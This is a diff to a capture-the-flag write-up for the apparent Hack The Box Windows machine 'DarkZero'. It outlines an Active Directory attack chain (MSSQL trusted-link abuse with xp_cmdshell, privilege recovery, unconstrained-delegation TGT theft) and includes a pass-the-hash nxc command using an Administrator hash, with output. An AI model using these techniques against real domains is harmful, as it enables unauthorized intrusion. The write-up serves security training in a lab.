@@ -5,6 +5,8 @@ categories: [writeup]
 ---
 
 # Machine Info
+DarkZero` is a hard-difficulty Windows machine designed around an assumed breach scenario in which the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment with Bidirectional trust, Cross-domain MSSQL Trusted Link, and `TGTDelegation`. The attacker discovers a misconfigured MSSQL trusted link, the link points to a different domain (`darkzero.htb` -> `darkzero.ext`), and the remote login has sysadmin privileges. The attacker enables the `xp_cmdshell` procedure as a sysadmin and executes commands. The spawned session under the `MSSQLSERVICE`, doesn't have `SeImpersonatePrivilege`; however, the user account running the service is configured and granted to have `SeServiceLogonRight`. The attacker is forced to change the password and get a new session with Logon Type 5 (Service Logon) to regain those privileges, and gain system privileges on the DC02 (`darkzero.ext`). To compromise the `darkzero.htb` domain, the attacker abuses `TGTdelegation` by forcing the DC01 to authenticate to DC02, having Unconstrained Delegation enabled.
+
 As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w / RFulUtONCOL!`
 # Nmap Scan
 ### DC01.darkzero.htb
@@ -534,13 +536,6 @@ Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
 ```
 Using the `Administrator`'s hash, I executed a `Pass-the-Hash` attack to retrieve the root flag.
 ```bash
-~/HTB/Windows/DarkZero $ nxc smb DC01 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x "type C:\Users\Administrator\Desktop\root.txt"
-SMB         10.129.13.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.13.92    445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
-SMB         10.129.13.92    445    DC01             [+] Executed command via wmiexec
-SMB         10.129.13.92    445    DC01             70bba28ca33281cc5acba9a856ebd8a6
-```
-```
 ~/HTB/Windows/DarkZero $ nxc smb DC01 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x "type C:\Users\Administrator\Desktop\root.txt"
 SMB         10.129.13.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.129.13.92    445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
